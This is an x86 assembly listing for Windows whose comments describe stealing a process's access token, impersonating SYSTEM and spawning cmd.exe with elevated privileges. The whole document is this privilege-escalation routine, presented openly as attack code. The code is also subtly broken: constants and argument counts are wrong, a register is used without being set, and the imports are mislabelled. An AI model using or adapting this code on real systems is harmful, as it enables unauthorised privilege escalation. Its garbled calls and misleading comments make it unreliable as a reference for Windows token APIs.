section .data
    ; Define the target process ID and CMD.EXE path
    pid dd 1234             ; Example target process ID
    cmd_path db 'cmd.exe', 0

section .text
global _start

_start:
    ; Open the target process and obtain its access token
    push dword 0x400        ; PROCESS_QUERY_INFORMATION
    push dword [pid]
    call dword [OpenProcess]

    push eax                ; Process handle
    push dword 0x20         ; TOKEN_ALL_ACCESS
    call dword [OpenProcessToken]

    ; Duplicate the process token for impersonation
    push eax                ; Process token handle
    push dword 0x2          ; SecurityIdentification
    push dword 0x4          ; TokenImpersonation
    call dword [DuplicateTokenEx]

    ; Impersonate SYSTEM user with the duplicated token
    push eax                ; Duplicated token handle
    call dword [ImpersonateLoggedOnUser]

    ; Execute CMD.EXE with SYSTEM privileges
    push dword 0            ; Duplicated token handle (not needed here)
    push dword 0            ; Environment parameter (not needed here)
    push dword 0            ; Environment parameter (not needed here)
    push dword 0            ; STARTUPINFO security parameter
    push dword 0            ; Parent window handle (not needed here)
    push dword 0            ; Title parameter (not needed here)
    push dword cmd_path     ; Program path to execute (CMD.EXE)
    call dword [CreateProcessA]

    ; Clean up handles and exit
    push eax                ; Process handle (CMD.EXE)
    call dword [CloseHandle]

    ; Clean up token handles
    push ebx                ; Duplicated token handle
    call dword [CloseHandle]
    push eax                ; Original process token handle
    call dword [CloseHandle]

    ; Exit the process
    push dword 0
    call dword [ExitProcess]

section .idata
    ; Import necessary functions from kernel32.dll
    import descriptor dll kernel32.dll
        func OpenProcess, 'OpenProcess'
        func OpenProcessToken, 'OpenProcessToken'
        func DuplicateTokenEx, 'DuplicateTokenEx'
        func ImpersonateLoggedOnUser, 'ImpersonateLoggedOnUser'
        func CreateProcessA, 'CreateProcessA'
        func CloseHandle, 'CloseHandle'
        func ExitProcess, 'ExitProcess'